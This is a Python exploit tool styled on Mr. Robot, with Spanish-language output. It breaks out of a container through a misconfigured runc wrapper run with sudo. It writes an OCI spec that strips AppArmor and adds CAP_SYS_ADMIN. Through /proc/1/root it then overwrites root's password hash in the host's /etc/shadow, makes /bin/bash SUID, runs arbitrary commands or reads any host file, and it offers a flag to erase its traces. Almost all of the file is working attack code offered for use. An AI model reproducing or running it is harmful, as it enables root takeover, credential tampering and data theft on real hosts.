#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
======== [ EXPLOIT RUNC VULNERABILITY ] ==========
Name: Fsociety-runc-breakout
Language: Python3
Creator: C0deGhost
Vulnerability: Container Misconfiguration / Privileged Container "LINUX"
Target: Custom runc wrappers (e.g., /opt/debug)
Version: 2.5 (Director's Cut)
==================================================
"""

import os
import sys
import json
import time
import shutil
import argparse
import subprocess
import crypt
import random
import string
import re
import base64
import platform

# ==============================================================================
# [ STYLE & AESTHETICS - MR. ROBOT THEME ]
# ==============================================================================

# Colores ANSI
RESET = '\033[0m'
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
GRAY = '\033[90m'
L_GRAY = '\033[37m'
BG_BLACK = '\033[40m'

# Iconos
SKULL = "💀"
KEY = "🔑"
GEAR = "⚙️"
CHECK = "✅"
WARN_ICON = "⚠️"
INJECT = "💉"
BUG = "🐛"
EYE = "👁️"

# ==============================================================================
# [ UI UTILITIES & ANIMATIONS ]
# ==============================================================================

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def typewriter(text, speed=0.04, color=L_GRAY, end="\n"):
    """ Efecto de escritura más lento y dramático """
    for char in text:
        sys.stdout.write(f"{color}{char}{RESET}")
        sys.stdout.flush()
        time.sleep(speed)
    sys.stdout.write(end)

def matrix_intro():
    """ Pequeño efecto visual al inicio """
    clear_screen()
    chars = "10"
    for _ in range(15):
        line = "".join(random.choice(chars) for _ in range(80))
        print(f"{GREEN}{DIM}{line}{RESET}")
        time.sleep(0.05)
    clear_screen()

def print_banner():
    """ Muestra el banner principal """
    print(f"{RED}███████╗{WHITE}███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗")
    print(f"{RED}██╔════╝{WHITE}██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝")
    print(f"{RED}█████╗  {WHITE}███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝ ")
    print(f"{RED}██╔══╝  {WHITE}╚════██║██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝  ")
    print(f"{RED}██║     {WHITE}███████║╚██████╔╝╚██████╗██║███████╗   ██║      ██║   ")
    print(f"{RED}╚═╝     {WHITE}╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝   ")
    
    print(f"{GRAY}" + "-"*78 + f"{RESET}")
    print(f" {BLUE}Creator: C0deGhost {GRAY}||{YELLOW} Version: 2.5 {GRAY}||{RED} PROPOSITY: Escalate Privilege (RunC){RESET}")
    print(f"{GRAY}" + "-"*78 + f"{RESET}")
    print(f"{RED}<chat> Mr. Robot@Fsociety$: > {L_GRAY}Dale un arma a un hombre y robará un banco,{RESET}")
    print(f"{L_GRAY}dale conocimiento a un hombre y robará el mundo.{RESET}")
    print(f"{GRAY}" + "-"*78 + f"{RESET}")

def print_banner_goodbye():
    print(f"\n{GRAY}" + "="*78 + f"{RESET}")
    print(f"{BLUE}")
    print("  ▄████  ▒█████   ▒█████  ▓█████▄  ▄▄▄▄ ▓██   ██▓▓█████ ")
    print(" ██▒ ▀█▒▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▓█████▄▒██  ██▒▓█   ▀ ")
    print("▒██░▄▄▄░▒██░  ██▒▒██░  ██▒░██   █▌▒██▒ ▄██▒██ ██░▒███   ")
    print("░▓█  ██▓▒██   ██░▒██   ██░░▓█▄   ▌▒██░█▀  ░ ▐██▓░▒▓█  ▄ ")
    print("░▒▓███▀▒░ ████▓▒░░ ████▓▒░░▒████▓ ░▓█  ▀█▓░ ██▒▓░░▒████▒")
    print(" ░▒   ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒ ░▒▓███▀▒ ██▒▒▒ ░░ ▒░ ░")
    print("  ░   ░   ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒ ▒░▒   ░▓██ ░▒░  ░ ░  ░")
    print("░ ░   ░ ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░  ░    ░▒ ▒ ░░     ░   ")
    print("      ░     ░ ░      ░ ░     ░     ░     ░ ░        ░  ░")
    print("                           ░            ░░ ░            ")
    print(f"{GRAY}" + "-"*78 + f"{RESET}")
    print(f"{CYAN}<chat> Mr. Robot@Fsociety$: > {WHITE}Bien Hecho Elliot, Ahora toma el control de todo el ecosistema.{RESET}")
    print(f"{GRAY}" + "-"*78 + f"{RESET}")
    print(f"{BLUE}GOOD BYE.. {RED}F R I E N D.{RESET}\n")

# Colores definidos localmente para las utilidades
DIM = '\033[2m'

def anim_loading(task_name):
    """ Animación extendida """
    sys.stdout.write(f"{CYAN}[{GEAR}] {task_name}... {RESET}")
    # Duración extendida para visibilidad
    frames = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
    for _ in range(15): # Más ciclos
        for char in frames:
            sys.stdout.write(f"\b{RED}{char}{RESET}")
            sys.stdout.flush()
            time.sleep(0.08) # Más lento
    sys.stdout.write(f"\b{GREEN}[DONE]{RESET}\n")

def anim_progressbar(prefix, total=30):
    """ Barra de progreso más lenta """
    sys.stdout.write(f"{prefix} ")
    for i in range(total + 1):
        percent = int(100 * (i / float(total)))
        bar = f"{RED}█{RESET}" * i + f"{GRAY}-{RESET}" * (total - i)
        sys.stdout.write(f"\r{prefix} |{bar}| {percent}%")
        sys.stdout.flush()
        time.sleep(0.05) # Delay aumentado
    print("")

def anim_phase_header(phase_name):
    """ Limpia pantalla y muestra cabecera de fase con delay """
    time.sleep(1) # Pausa para leer lo anterior
    clear_screen()
    print_banner()
    print(f"\n{BG_BLACK}{RED} >> EXPLOIT PHASE: {phase_name} {RESET}")
    print(f"{GRAY}" + "="*40 + f"{RESET}\n")
    time.sleep(0.8)

def log(type, msg):
    if type == "INFO":
        print(f"{BLUE}[*]{RESET} {msg}")
    elif type == "SUCCESS":
        print(f"{GREEN}[+]{RESET} {msg}")
    elif type == "WARN":
        print(f"{YELLOW}[!]{RESET} {msg}")
    elif type == "ERROR":
        print(f"{RED}[X]{RESET} {msg}")
    elif type == "DEBUG":
        print(f"{GRAY}[{BUG}]{RESET} {msg}")
        time.sleep(0.1) # Pequeño delay en logs debug para efecto "stream"
    elif type == "VERBOSE":
        print(f"{DIM}{CYAN}   -> {msg}{RESET}")
        time.sleep(0.05)

def print_styled_help():
    clear_screen()
    print_banner()
    print(f"\n{RED}" + "F S O C I E T Y   -   O P T I O N S".center(78) + f"{RESET}")
    print(f"{GRAY}" + "-"*78 + f"{RESET}\n")

    def print_opt(flag, arg, desc):
        flag_str = f"{GREEN}{flag}{RESET} {YELLOW}{arg}{RESET}"
        print(f"  {flag_str:<45} {L_GRAY}{desc}{RESET}")

    print(f"{BOLD}{WHITE}[ TARGET CONFIGURATION ]{RESET}")
    print_opt("-t, --target", "<PATH>", "Ruta del binario wrapper (Ej: /opt/debug)")
    print_opt("-P, --wrapper-pass", "<PASS>", "Contraseña administrativa del wrapper")
    print_opt("-sudo, --sudo-l", "<PASS>", "Contraseña de sudo del usuario actual")
    print("")
    print(f"{BOLD}{WHITE}[ PAYLOAD MODES ]{RESET}")
    print_opt("-m, --mode", "<MODE>", "shadow | suid | rce | read")
    print_opt("-c, --command-exec", "<CMD>", "Comando a ejecutar (Solo modo RCE)")
    print_opt("--root-pass", "<PASS>", "Nueva pass para root (Modo Shadow)")
    print_opt("--read-file", "<FILE>", "Archivo a leer (Modo Read)")
    print("")
    print(f"{BOLD}{WHITE}[ OPSEC & MISC ]{RESET}")
    print_opt("-w, --workspace", "<PATH>", "Directorio de trabajo")
    print_opt("-v, --verbose", "", "Activar salida detallada (Modo Matrix)")
    print_opt("--cleanup", "", "Borrar rastros al finalizar")
    print(f"\n{GRAY}" + "-"*78 + f"{RESET}")
    sys.exit(0)

def highlight_json(data):
    """ Colorea el JSON para el output verbose """
    json_str = json.dumps(data, indent=4)
    json_str = re.sub(r'(".*?")(\s*:)', f'{BLUE}\\1{RESET}\\2', json_str)
    json_str = re.sub(r'(: \s*)(".*?")', f'\\1{YELLOW}\\2{RESET}', json_str)
    json_str = re.sub(r'(: \s*)(true|false|null|[0-9]+)', f'\\1{RED}\\2{RESET}', json_str)
    return json_str

# ==============================================================================
# [ CORE EXPLOIT LOGIC ]
# ==============================================================================

class FsocietyExploit:
    def __init__(self, args):
        self.target = args.target
        self.wrapper_pass = args.wrapper_pass
        self.sudo_pass = args.sudo_l
        self.mode = args.mode
        self.root_pass = args.root_pass
        self.workspace = args.workspace
        self.cleanup_flag = args.cleanup
        self.verbose = args.verbose
        self.read_file = args.read_file
        self.command_exec = args.command_exec
        
        self.rootfs = os.path.join(self.workspace, "rootfs")
        self.config_file = os.path.join(self.workspace, "config.json")
        self.container_id = "fsociety_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

    def preflight_check(self):
        """ [NEW] V2.5: Validación temprana de credenciales y entorno """
        anim_phase_header("PRE-FLIGHT CHECKS")
        anim_loading("Validating Credentials & Host")
        
        # Check architecture
        arch = platform.machine()
        if self.verbose: log("VERBOSE", f"Host Architecture: {arch}")
        if arch not in ["x86_64", "amd64"]:
            log("WARN", f"Architecture {arch} might not support copied libs.")

        # Sudo Check
        if self.sudo_pass:
            if self.verbose: log("DEBUG", "Testing Sudo credentials...")
            try:
                cmd = f"echo '{self.sudo_pass}' | sudo -S id"
                subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL)
                log("SUCCESS", "Sudo credentials: VALID")
            except subprocess.CalledProcessError:
                log("ERROR", "Sudo password incorrect. Aborting.")
                sys.exit(1)
        else:
            if self.verbose: log("DEBUG", "Skipping Sudo check (No password provided).")

        time.sleep(1)

    def check_env(self):
        anim_phase_header("SYSTEM RECONNAISSANCE")
        anim_loading("Scanning Target Environment")
        
        if self.verbose: 
            log("VERBOSE", f"Target Binary: {self.target}")
            log("VERBOSE", f"Current UID: {os.getuid()}")
            log("VERBOSE", f"Workspace: {self.workspace}")
        
        if not os.path.exists(self.target):
            log("ERROR", f"El objetivo {self.target} no existe.")
            sys.exit(1)
        
        log("SUCCESS", f"Target Locked: {BOLD}{self.target}{RESET}")
        
        if os.path.exists(self.workspace):
            if self.verbose: log("VERBOSE", f"Cleaning old workspace...")
            shutil.rmtree(self.workspace)
        
        try:
            os.makedirs(self.rootfs, exist_ok=True)
            log("SUCCESS", f"Workspace Initialized: {CYAN}{self.workspace}{RESET}")
        except Exception as e:
            log("ERROR", f"Failed to create workspace: {e}")
            sys.exit(1)
        
        time.sleep(1.5)

    def resolve_libs(self, binary_path):
        """ The Jailbuilder Logic: LDD Parsing """
        if self.verbose: log("VERBOSE", f"Tracing libs for: {binary_path}")
        try:
            output = subprocess.check_output(f"ldd {binary_path}", shell=True, stderr=subprocess.DEVNULL).decode()
            libs = set()
            for line in output.splitlines():
                match = re.search(r' => (\S+) \(', line)
                if match:
                    libs.add(match.group(1))
                else:
                    match_direct = re.search(r'\s(/\S+)\s\(', line)
                    if match_direct:
                        libs.add(match_direct.group(1))
            return list(libs)
        except subprocess.CalledProcessError:
            if self.verbose: log("VERBOSE", f"  [!] Static binary or LDD missing.")
            return []

    def find_binary_on_host(self, bin_name):
        if bin_name.startswith("/"):
            return bin_name if os.path.exists(bin_name) else None
        common_paths = ["/bin", "/usr/bin", "/sbin", "/usr/sbin", "/usr/local/bin"]
        for path in common_paths:
            full_path = os.path.join(path, bin_name)
            if os.path.exists(full_path):
                return full_path
        return None

    def build_rootfs(self):
        anim_phase_header("JAILBUILDER: ROOTFS CONSTRUCTION")
        anim_progressbar(f"{GEAR} Cloning Host Binaries")

        dirs = ["bin", "lib", "lib64", "usr/bin", "usr/lib", "etc", "tmp"]
        for d in dirs:
            os.makedirs(os.path.join(self.rootfs, d), exist_ok=True)

        binaries = ["/bin/bash", "/bin/sh", "/usr/bin/sed", "/usr/bin/id", "/usr/bin/chmod", "/usr/bin/ls", "/usr/bin/cat", "/usr/bin/base64"]
        
        if self.mode == "rce" and self.command_exec:
            target_bin = self.command_exec.split()[0]
            host_path = self.find_binary_on_host(target_bin)
            if host_path:
                if host_path not in binaries:
                    log("INFO", f"Importing RCE Binary: {CYAN}{host_path}{RESET}")
                    binaries.append(host_path)
            else:
                log("WARN", f"Binary '{target_bin}' not found on host. Execution might fail.")

        count = 0
        copied_libs = set()

        for binary in binaries:
            if not os.path.exists(binary): continue

            dest = os.path.join(self.rootfs, binary.lstrip("/"))
            os.makedirs(os.path.dirname(dest), exist_ok=True)
            try:
                shutil.copy2(binary, dest)
                if self.verbose: 
                    log("VERBOSE", f"Cloned: {binary}")
                    time.sleep(0.05) # Visual effect
                count += 1
            except: pass

            libs = self.resolve_libs(binary)
            for lib in libs:
                if lib in copied_libs: continue
                lib_dest = os.path.join(self.rootfs, lib.lstrip("/"))
                if not os.path.exists(lib_dest):
                    os.makedirs(os.path.dirname(lib_dest), exist_ok=True)
                    try:
                        shutil.copy2(lib, lib_dest)
                        copied_libs.add(lib)
                    except: pass
        
        sh_path = os.path.join(self.rootfs, "bin/sh")
        if not os.path.exists(sh_path):
            os.symlink("bash", sh_path)

        log("SUCCESS", f"RootFS Ready: {count} binaries | {len(copied_libs)} libraries.")
        
        with open(os.path.join(self.rootfs, "etc/passwd"), "w") as f:
            f.write("root:x:0:0:root:/root:/bin/bash\n")
        with open(os.path.join(self.rootfs, "etc/group"), "w") as f:
            f.write("root:x:0:\n")
        
        time.sleep(1.5)

    def generate_nuclear_config(self):
        anim_phase_header("NUCLEAR CONFIGURATION (SECURITY STRIPPING)")
        
        print(f"{WARN_ICON} Desactivando AppArmor...")
        time.sleep(0.3)
        print(f"{WARN_ICON} Eliminando PID Namespace...")
        time.sleep(0.3)
        print(f"{WARN_ICON} Inyectando Capabilities (CAP_SYS_ADMIN)...")
        time.sleep(0.3)
        
        config = {
            "ociVersion": "1.0.2-dev",
            "process": {
                "terminal": False,
                "user": {"uid": 0, "gid": 0},
                "args": ["/bin/sh"],
                "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "TERM=xterm"],
                "cwd": "/",
                "capabilities": {
                    "bounding": ["CAP_SYS_ADMIN", "CAP_DAC_OVERRIDE", "CAP_AUDIT_WRITE", "CAP_KILL", "CAP_NET_BIND_SERVICE", "CAP_SYS_PTRACE", "CAP_SYSLOG"],
                    "effective": ["CAP_SYS_ADMIN", "CAP_DAC_OVERRIDE", "CAP_AUDIT_WRITE", "CAP_KILL", "CAP_NET_BIND_SERVICE", "CAP_SYS_PTRACE", "CAP_SYSLOG"],
                    "inheritable": ["CAP_SYS_ADMIN", "CAP_DAC_OVERRIDE", "CAP_AUDIT_WRITE", "CAP_KILL", "CAP_NET_BIND_SERVICE", "CAP_SYS_PTRACE", "CAP_SYSLOG"],
                    "permitted": ["CAP_SYS_ADMIN", "CAP_DAC_OVERRIDE", "CAP_AUDIT_WRITE", "CAP_KILL", "CAP_NET_BIND_SERVICE", "CAP_SYS_PTRACE", "CAP_SYSLOG"],
                    "ambient": ["CAP_SYS_ADMIN", "CAP_DAC_OVERRIDE", "CAP_AUDIT_WRITE", "CAP_KILL", "CAP_NET_BIND_SERVICE", "CAP_SYS_PTRACE", "CAP_SYSLOG"]
                },
                "rlimits": [{"type": "RLIMIT_NOFILE", "hard": 1024, "soft": 1024}],
                "noNewPrivileges": False,
                "apparmorProfile": ""
            },
            "root": {
                "path": "rootfs",
                "readonly": True
            },
            "mounts": [
                {"destination": "/proc", "type": "proc", "source": "proc", "options": ["nosuid", "noexec", "nodev"]},
                {"destination": "/dev", "type": "tmpfs", "source": "tmpfs", "options": ["nosuid", "strictatime", "mode=755", "size=65536k"]},
            ],
            "linux": {
                "namespaces": [
                    {"type": "mount"},
                    {"type": "network"}
                ],
                "maskedPaths": [],
                "readonlyPaths": []
            }
        }
        
        with open(self.config_file, "w") as f:
            json.dump(config, f, indent=4)
        
        if self.verbose:
            print(f"\n{WHITE}{BOLD}[DEBUG] Generated OCI Spec:{RESET}")
            print(highlight_json(config))
            time.sleep(2) # Tiempo para leer el JSON

        anim_loading("Deploying Spec")
        log("SUCCESS", "Configuración Nuclear lista.")
        time.sleep(1)

    def inject_payload(self):
        anim_phase_header(f"PAYLOAD INJECTION: MODE {self.mode.upper()}")
        
        with open(self.config_file, "r") as f:
            data = json.load(f)

        cmd = ""
        
        if self.mode == "shadow":
            salt = crypt.mksalt(crypt.METHOD_SHA512)
            new_hash = crypt.crypt(self.root_pass, salt)
            typewriter(f"{KEY} Generating Hash for '{self.root_pass}'...", speed=0.03)
            cmd = f"sed -i 's|^root:[^:]*:|root:{new_hash}:|' /proc/1/root/etc/shadow && echo 'SUCCESS_SHADOW'"
            
        elif self.mode == "suid":
            cmd = "chmod 4755 /proc/1/root/bin/bash && echo 'SUCCESS_SUID'"
            
        elif self.mode == "rce":
            if not self.command_exec:
                log("ERROR", "Modo rce requiere -c <comando>")
                sys.exit(1)
            cmd = self.command_exec
            
        elif self.mode == "read":
            if not self.read_file:
                log("ERROR", "Modo read requiere el archivo como argumento")
                sys.exit(1)
            cmd = f"cat /proc/1/root{self.read_file}"

        full_cmd = f"echo '--- [FSOCIETY START] ---'; id; {cmd}; echo '--- [FSOCIETY END] ---'"
        
        data["process"]["args"] = ["/bin/sh", "-c", full_cmd]
        
        if self.verbose:
            print(f"\n{WHITE}{BOLD}[DEBUG] Injected Command (process.args):{RESET}")
            print(f"{DIM}{full_cmd}{RESET}\n")
            time.sleep(1.5)

        with open(self.config_file, "w") as f:
            json.dump(data, f, indent=4)
            
        log("SUCCESS", "Payload Inyectado.")
        time.sleep(1)

    def execute(self):
        anim_phase_header("EXPLOITATION")
        
        print(f"{CYAN}< {RED}Mr.Robot@{WHITE}Fsociety:$ {CYAN}> {RESET} Operador, preparación lista. ¿Iniciar explotación? {YELLOW}[Y/n]{RESET}: ", end="")
        resp = input().strip().lower()
        if resp != 'y':
            log("WARN", "Abortando misión.")
            sys.exit(0)

        print("")
        anim_loading("Executing Exploit")
        
        cwd_bkp = os.getcwd()
        try:
            os.chdir(self.workspace)

            input_chain = ""
            if self.sudo_pass: input_chain += f"{self.sudo_pass}\\n"
            if self.wrapper_pass: input_chain += f"{self.wrapper_pass}\\n"
            
            base_cmd = f"sudo -S {self.target} run {self.container_id}"
            
            if input_chain:
                full_cmd = f"printf '{input_chain}' | {base_cmd}"
            else:
                full_cmd = base_cmd

            if self.verbose:
                log("VERBOSE", f"OS Command:\n{DIM}{full_cmd}{RESET}")
                time.sleep(1)

            log("INFO", "Binario ejecutándose... (Salida directa del Kernel)")
            print(f"{GRAY}" + "="*60 + f"{RESET}")
            time.sleep(0.5)
            
            exit_code = os.system(full_cmd)
            
            print(f"{GRAY}" + "="*60 + f"{RESET}")

            if exit_code == 0:
                log("SUCCESS", "Ejecución finalizada correctamente.")
                if self.mode == "shadow":
                    print(f"\n{GREEN}{BOLD}[!!!] PWNED: ROOT PASSWORD CHANGED TO '{self.root_pass}' [!!!]{RESET}")
                elif self.mode == "suid":
                    print(f"\n{GREEN}{BOLD}[!!!] PWNED: BASH IS NOW SUID [!!!]{RESET}")
            else:
                log("WARN", f"El binario retornó código de error: {exit_code >> 8}")

        except Exception as e:
            log("ERROR", f"Fallo crítico en ejecución: {e}")
        finally:
            os.chdir(cwd_bkp)
            time.sleep(3)

    def cleanup(self):
        if self.cleanup_flag:
            log("INFO", "Limpiando rastros...")
            if os.path.exists(self.workspace):
                shutil.rmtree(self.workspace)
            log("SUCCESS", "Huellas borradas.")

# ==============================================================================
# [ MAIN EXECUTION ]
# ==============================================================================

if __name__ == "__main__":
    matrix_intro() # [NEW] Intro Effect
    
    if '-h' in sys.argv or '--help' in sys.argv:
        print_styled_help()

    parser = argparse.ArgumentParser(description="Fsociety RunC Breakout Tool", add_help=False)
    
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-P", "--wrapper-pass")
    parser.add_argument("-sudo", "--sudo-l")
    parser.add_argument("-m", "--mode", choices=["shadow", "suid", "rce", "read"], default="shadow")
    parser.add_argument("--root-pass", default="fsociety-pw3ned!")
    parser.add_argument("--read-file")
    parser.add_argument("-c", "--command-exec")
    parser.add_argument("--lhost") 
    parser.add_argument("--lport")
    parser.add_argument("-w", "--workspace", default="/tmp/fsociety_ghost")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("--cleanup", action="store_true")

    args = parser.parse_args()

    print_banner()
    
    exploit = FsocietyExploit(args)
    
    try:
        exploit.preflight_check() # [NEW] Pre-flight Check
        exploit.check_env()
        exploit.build_rootfs()
        exploit.generate_nuclear_config()
        exploit.inject_payload()
        exploit.execute()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Interrupción detectada.{RESET}")
    finally:
        exploit.cleanup()
        print_banner_goodbye()
